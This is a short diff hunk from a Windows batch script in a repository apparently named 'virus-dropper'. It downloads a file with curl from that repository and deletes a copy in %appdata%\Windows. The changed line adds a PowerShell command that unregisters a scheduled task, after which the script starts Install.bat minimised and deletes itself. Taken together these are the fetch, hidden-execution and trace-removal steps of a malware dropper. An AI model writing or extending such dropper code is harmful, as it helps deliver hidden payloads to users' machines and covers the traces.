@@ -35,7 +35,7 @@ curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/In
 
 del /f "%appdata%\Windows\Install.bat"
 rd %appdata%\Windows
-e
+powershell -Command "Unregister-ScheduledTask -TaskName 'Install.bat' -Confirm:$false"
 
 start /min Install.bat
 call :deleteSelf&exit
